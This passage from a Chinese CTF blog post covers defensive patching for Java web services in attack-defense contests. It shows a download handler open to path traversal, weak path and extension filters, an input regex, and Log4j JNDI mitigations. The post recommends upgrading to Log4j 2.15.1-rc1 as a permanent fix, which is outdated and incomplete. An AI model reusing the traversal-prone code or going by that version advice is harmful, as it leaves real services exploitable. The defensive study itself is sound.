class="string">&quot;resources/images/&quot;</span>, image);</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file); <span class="comment">//输出文件</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(inputStream);</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[fis.available()];</span><br><span class="line">            fis.read(buffer);</span><br><span class="line">            fis.close();</span><br><span class="line">            response.reset();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取文件的名字再浏览器下载页面</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> file.getName();</span><br><span class="line">            response.addHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment;filename=&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(name.getBytes(), <span class="string">&quot;iso-8859-1&quot;</span>));</span><br><span class="line">            response.addHeader(<span class="string">&quot;Content-Length&quot;</span>, <span class="string">&quot;&quot;</span> + file.length());</span><br><span class="line">            <span class="type">OutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(response.getOutputStream());</span><br><span class="line">            response.setContentType(<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">            out.write(buffer);</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>简单waf：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">validFilePath</span><span class="params">(File file)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (file.getCanonicalPath().startsWith(<span class="string">&quot;E:\\source\\xxxxxx\\ezfastjson2\\ezfastjson2\\ezfastjson2\\ezfastjson2&quot;</span>))&#123;</span><br><span class="line">            <span class="comment">//转绝对路径去匹配网站目录，绝对路径</span></span><br><span class="line">						<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping(&quot;/include/image&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getImage</span><span class="params">(<span class="meta">@RequestParam</span> String image, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//HttpServletResponse response = new HttpServletResponse();</span></span><br><span class="line">            <span class="comment">//ClassPathResource classPathResource = new ClassPathResource(&quot;sql/SCHEDULE_TASK.sql&quot;);</span></span><br><span class="line"></span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;resources/images/&quot;</span>, image);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// waf</span></span><br><span class="line">            <span class="keyword">if</span>(!validFilePath(file))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;ah-oh&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file); <span class="comment">//输出文件</span></span><br><span class="line"></span><br><span class="line">						...</span><br></pre></td></tr></table></figure>
<p>只能够简单的防御，特定情况下还能够bypass</p>
<h4><span id="文件写"> 文件写</span></h4>
<p>简单防御：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">validFilePath</span><span class="params">(File file)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (file.getCanonicalPath().startsWith(<span class="string">&quot;E:\\source\\huaweiCTF\\7.31\\ezfastjson2\\ezfastjson2\\ezfastjson2\\ezfastjson2&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(!file.getCanonicalPath().endsWith(<span class="string">&quot;.jsp&quot;</span>) &amp;&amp; !file.getCanonicalPath().endsWith(<span class="string">&quot;.jar&quot;</span>) )</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 找一个路径插入</span></span><br></pre></td></tr></table></figure>
<h4><span id="rce"> rce</span></h4>
<p>对传参点进行过滤：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!Pattern.matches(&quot;[0-9A-Za-z@.]+&quot;, dir)) &#123;</span><br></pre></td></tr></table></figure>
<h4><span id="log4j2"> log4j2</span></h4>
<p>分不同版本：</p>
<ul>
<li>2.10及以上</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jvm参数添加 -Dlog4j2.formatMsgNoLookups=true</span><br></pre></td></tr></table></figure>
<p>在应用程序的classpath下添加<code>log4j2.component.properties</code>配置文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log4j2.formatMsgNoLookups=True;</span><br></pre></td></tr></table></figure>
<p>系统环境变量：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS,LOG4J_FORMAT_MSG_NO_LOOKUPS设置为true</span><br></pre></td></tr></table></figure>
<ul>
<li>1.x</li>
</ul>
<p>对于log4j 1.x版本，移除JMSAppender.class文件，命令为：<code>zip -q -d log4j-1.x.jar org/apache/log4j/net/JMSAppender.class</code></p>
<p>注意测试，防止对业务产生影响</p>
<ul>
<li>2.x</li>
</ul>
<p>移除<code>JndiLookup</code>类的方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -q -d log4j-core-2.x.jar org/apache/log4j/core/lookup/JndiLookup.class</span><br></pre></td></tr></table></figure>
<p>永久修复：</p>
<p>升级到最高版本<code>log4-2.15.1-rc1</code></p>
<p>并弃用log4j 1.x版本</p>
<h3><span id="awd_java_web_patch"> awd_java_web_patch</span></h3>
<p><a target="_blank" rel="noopener" href="https://github.com/Jlan45/AWDJavaWebPatch">GitHub - Jlan45/AWDJavaWebPatch: 通过jar包快速生成patch模版</a></p>
<blockquote>
<p>个人推荐的用法是不进行jar包或war包的打包，而是通过本项目生成好IDEA项目之后只进行1、2、3步骤的配置，然后通过压缩软件对编译好的class文件直接进行替换，目前测试Bandizip可以保证替换前后jar包和war包的可用性</p>
<p>有部分的jar包war包反编译的class是经过编译器优化的，这也导致反编译后生成的Java文件会有奇怪的语法错误，这时候对症下药即可，也可以直接删除所有java文件只保留你需要进行patch的</p>
<p>最后祝各位师傅在AWD赛场上玩的愉快，不被环境困扰</p>
</blockquote>
<h1><span id="文件监控"> 文件监控</span></h1>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/TheKingOfDuck/FileMonitor</span><br></pre></td></tr></table></figure>
<p>查最近十分钟被修改的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name *.php -mmin -5 </span><br></pre></td></tr></table></figure>
</div>
        </div>
        
            <div class="kratos-copyright text-center clearfix">
                <h5 itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
            </div>
        
        <footer class="kratos-entry-footer clearfix">
            
                <div class="post-like-donate text-center clearfix" id="post-like-donate">
                
                    <a class="donate" href="javascript:;"><i class="fa fa-bitcoin"></i> 打赏</a>
                
                
                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
                    <div class="share-wrap" style="display: none;">
    <div class="share-group">
        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-qq"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-star"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-weixin"></i>
            </div>
            <div class="share-int">
                <div class="qrcode" id="wechat-qr"></div>
                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
            </div>
        </a>
        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-weibo"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-facebook"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-twitter"></i>
            </div>
        </a>
    </div>
    <script type="text/javascript">
        $(()=>{
            new QRCode("wechat-qr", {
                text: "http://example.com/posts/57335.html",
                width: 150,
                height: 150,
                correctLevel : QRCode.CorrectLevel.H
            });
        });
        function share(dest) {
            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
            const weiboBase     = "https://service.weibo.com/share/share.php?";
            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
            const twitterBase   = "https://twitter.com/intent/tweet?";
            const hostUrl       = "http://example.com/posts/57335.html";
            const title         = "「被awd速通(1)」";
            const excerpt       = `心血来潮学习awd(吗？)`;
            let _URL;
            switch (dest) {
                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
            }
            window.open(_URL);
        };
    </script>
</div>
                
                </div>
            
            <div class="footer-tag clearfix">
                <div class="pull-left">
                <i class="fa fa-tags"></i>
                    <a class="tag-none-link" href="/tags/awd/" rel="tag">awd</a>
                </div>
                <div class="pull-date">
                    <time datetime="2024-06-06T08:06:14.000Z" itemprop="dateModified">最后编辑：2024-06-06</time>
                </div>
            </div>
        </footer>
    </div>
    
        <nav class="navigation post-navigation clearfix" role="navigation">
            
            <div class="nav-previous clearfix">
                <a title=" XYCTF2024 Web方向题解" href="/posts/52072.html">&lt; 上一篇</a>
            </div>
            
            
            <div class="nav-next clearfix">
                <a title=" SPEL表达式注入" href="/posts/56097.html">下一篇 &gt;</a>
            </div>
            
        </nav>
    
    
        <div id="v-comments" class="post-comments bg-image"></div>
<script>
    var load_comm = () => {
        const init = () => {
            new Valine({
                el: '#v-comments',
                appId: 'bNjjbBH5XN8401rWT4xZhbCF-gzGzoHsz',
                appKey: 'R4c5rtiMieN1Kb3frShXDfw8',
                visitor: true,
                enableQQ: false,
                path: '/posts/57335.html'
                
            });
        }
        if (typeof Valine === 'undefined') {
            const src = '/vendors/valine@1.4.18/dist/Valine.min.js';
            $.getScript(src, init);
        } else {
            init();
        }
    };
</script>


<script>
<style>
    .v .veditor{min-height: 10rem;
        background-image: url(https://cdn.jsdelivr.net/gh/cungudafa/img/images/girls2.png);
        background-size: contain;
        background-repeat: no-repeat;
        background-position: right;
        background-color: rgba(255,255,255,0);
        resize: none;}
</style>
</script>


    <script>
        new Valine({
            el: '#vcomments',
            lang: 'zh-cn',
            admin_email: '83635877@qq.com',//博主邮箱
            appId: "",
            appKey: "",
            path: window.location.pathname,
            comment_count: true,
            //notify: false, // 邮件提醒!使用第三方就不要添加这个!!
            //verify: true, //验证码
            avatar: 'monsterid',//小怪物头像
            placeholder: "qwq~"
        });
        
</script>
    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
    <script type="text/javascript">
        jinrishici.load(function(result) {
            var jrsc_plac =  result.data.content + "\n「" + result.data.origin.title + "」" + result.data.origin.dynasty + " · " + result.data.origin.author;
            document.getElementById("veditor").setAttribute("placeholder",jrsc_plac);
        })
    </script>

<noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://valine.js.org/">comments powered by Valine.</a></noscript>

    
</article>

        

            </section>

        

        <script src="./js/src/Valine.min.js"></script>   
        
        
            

<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
    
    
                <aside id="krw-about" class="widget widget-kratos-about clearfix">
    <div class="photo-background"></div>
    <div class="photo-wrapper clearfix">
        <div class="photo-wrapper-tip text-center">
            <img class="about-photo" src="/images/touxiang.png" loading="lazy" decoding="auto" />
        </div>
    </div>
    <div class="textwidget">
        <p class="text-center"></p>
    </div>
    <div class="site-meta">
        <a class="meta-item" href="/archives/">
            <span class="title">
                文章
            </span>
            <span class="count">
                84
            </span>
        </a>
        <a class="meta-item" href="/categories/">
            <span class="title">
                分类
            </span>
            <span class="count">
                12
            </span>
        </a>
        <a class="meta-item" href="/tags/">
            <span class="title">
                标签
            </span>
            <span class="count">
                14
            </span>
        </a>
    </div>
</aside>
            
                    <div class="sticky-area">
                
                
  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">-CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">22</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/java/">java</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web/">CTF Web</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web-WriteUp/">CTF Web WriteUp</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-WriteUp/">CTF WriteUp</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Intro/">Intro</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a><span class="category-list-count">13</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A%E7%B3%BB%E5%88%97/">不务正业系列</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">基础漏洞</a><span class="category-list-count">16</span></li></ul>
  </aside>


            
                
  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
      <div class="tag-clouds">
        <a href="/tags/Introduce-Myself/" style="font-size: 0.6em;">Introduce_Myself</a> <a href="/tags/Java/" style="font-size: 0.6em;">Java</a> <a href="/tags/Misc/" style="font-size: 0.63em;">Misc</a> <a href="/tags/POST/" style="font-size: 0.69em;">POST</a> <a href="/tags/RCE/" style="font-size: 0.69em;">RCE</a> <a href="/tags/SQL-Injection/" style="font-size: 0.71em;">SQL_Injection</a> <a href="/tags/Upload/" style="font-size: 0.6em;">Upload</a> <a href="/tags/Web/" style="font-size: 0.8em;">Web</a> <a href="/tags/awd/" style="font-size: 0.66em;">awd</a> <a href="/tags/java/" style="font-size: 0.74em;">java</a> <a href="/tags/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A/" style="font-size: 0.6em;">不务正业</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" style="font-size: 0.77em;">基础漏洞</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 0.6em;">杂项</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 0.71em;">渗透</a>
      </div>
  </aside>

            
                
  <aside id="krw-posts" class="widget widget-kratos-posts">
  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
  <div class="tab-content">
      <ul class="list-group">
        
        
          
          
            <a class="list-group-item" href="/posts/58260.html"><i class="fa  fa-book"></i> VulnStack 7</a>
            
          
        
          
          
            <a class="list-group-item" href="/posts/6350.html"><i class="fa  fa-book"></i> SPEL注入Spring内存马</a>
            
          
        
          
          
            <a class="list-group-item" href="/posts/58068.html"><i class="fa  fa-book"></i> VulnStack 4</a>
            
          
        
          
          
            <a class="list-group-item" href="/posts/10200.html"><i class="fa  fa-book"></i> 2024鹏城杯线上赛Web方向题解</a>
            
          
        
          
          
            <a class="list-group-item" href="/posts/49264.html"><i class="fa  fa-book"></i> dasctf十月web方向部分题解</a>
            
          
        
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
      </ul>
  </div>
  </aside>

            
    </div>
</section>

        
        </div>
    </div>
</div>
<footer>
    <div id="footer"  class="ap-lrc"  >
        <div class="container">
            <div class="row">
                <div class="col-md-6 col-md-offset-3 footer-list text-center">
                    <ul class="kratos-social-icons">
                        <li><a target="_blank" rel="nofollow" href="https://weibo.com/u/HyDr0genSpectRuM"><i class="fa fa-weibo"></i></a></li>
                        
                        
                        
                        
                        
                        
                        <li><a target="_blank" rel="nofollow" href="https://github.com/Err0r233"><i class="fa fa-github"></i></a></li>
                        
                    </ul>
                    <ul class="kratos-copyright">
                        <div>
                            <li>&copy; 2024 Err0r233 版权所有.</li>
                            <li>本站已运行<span id="span_dt">Loading...</span></li>
                        </div>
                        <div>
                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by Err0r2333.</li>
                        </div>
                        <div>
                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
                        </div>
                        <div>
                            
                            
                        </div>
                        <div id="binft"></div>
  <script>
    var binft = function (r) {
      function t() {
        return b[Math.floor(Math.random() * b.length)]
      }  
      function e() {
        return String.fromCharCode(94 * Math.random() + 33)
      }
      function n(r) {
        for (var n = document.createDocumentFragment(), i = 0; r > i; i++) {
          var l = document.createElement("span");
          l.textContent = e(), l.style.color = t(), n.appendChild(l)
        }
        return n
      }
      function i() {
        var t = o[c.skillI];
        c.step ? c.step-- : (c.step = g, c.prefixP < l.length ? (c.prefixP >= 0 && (c.text += l[c.prefixP]), c.prefixP++) : "forward" === c.direction ? c.skillP < t.length ? (c.text += t[c.skillP], c.skillP++) : c.delay ? c.delay-- : (c.direction = "backward", c.delay = a) : c.skillP > 0 ? (c.text = c.text.slice(0, -1), c.skillP--) : (c.skillI = (c.skillI + 1) % o.length, c.direction = "forward")), r.textContent = c.text, r.appendChild(n(c.prefixP < l.length ? Math.min(s, s + c.prefixP) : Math.min(s, t.length - c.skillP))), setTimeout(i, d)
      }
      var l = "",
      o = ["青青陵上柏，磊磊涧中石。", "人生天地间，忽如远行客。","斗酒相娱乐，聊厚不为薄。", "驱车策驽马，游戏宛与洛。","洛中何郁郁，冠带自相索。","长衢罗夹巷，王侯多第宅。","两宫遥相望，双阙百余尺。","极宴娱心意，戚戚何所迫？"].map(function (r) {
      return r + ""
      }),
      a = 2,
      g = 1,
      s = 5,
      d = 75,
      b = ["rgb(110,64,170)", "rgb(150,61,179)", "rgb(191,60,175)", "rgb(228,65,157)", "rgb(254,75,131)", "rgb(255,94,99)", "rgb(255,120,71)", "rgb(251,150,51)", "rgb(226,183,47)", "rgb(198,214,60)", "rgb(175,240,91)", "rgb(127,246,88)", "rgb(82,246,103)", "rgb(48,239,130)", "rgb(29,223,163)", "rgb(26,199,194)", "rgb(35,171,216)", "rgb(54,140,225)", "rgb(76,110,219)", "rgb(96,84,200)"],
      c = {
        text: "",
        prefixP: -s,
        skillI: 0,
        skillP: 0,
        direction: "forward",
        delay: a,
        step: g
      };
      i()
      };
      binft(document.getElementById('binft'));
  </script>
                    </ul>
                </div>
            </div>
        </div>
        <div class="kr-tool text-center">
            <div class="tool">
                
                    <div class="box search-box">
                        <a href="/search/">
                            <span class="fa fa-search"></span>
                        </a>
                    </div>
                
                
                    <div class="box theme-box" id="darkmode-switch">
                        <span class="fa fa-adjust"></span>
                    </div>
                
                
            </div>
            <div class="box gotop-box">
                <span class="fa fa-chevron-up"></span>
            </div>
        </div>
    </div>
</footer>
</div>
</div>


        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
<script>
    if (!window.kr) {
        window.kr = {};
    }
    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
    window.kr.siteRoot = "/";
</script>

    <div>
        <canvas id="snow"></canvas>
        <script async src="/js/snow.min.js"></script>
    </div>


    <script async src="/js/candy.min.js"></script>



    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
    
    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
    <meting-js
        server="netease"
        type="playlist"
        id="7733928587"
        order="random"
        fixed="true"
    >
    </meting-js>



    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>

<script defer src="/vendors/clipboard@2.0.6/dist/clipboard.min.js"></script>
<script defer src="/js/kratosr.min.js"></script>
<script defer src="/js/pjax.min.js"></script>

    <script defer src="/vendors/layui-src@2.5.5/dist/layui.all.js"></script>



<!-- Extra support for third-party plguins  -->



    </body>
</html>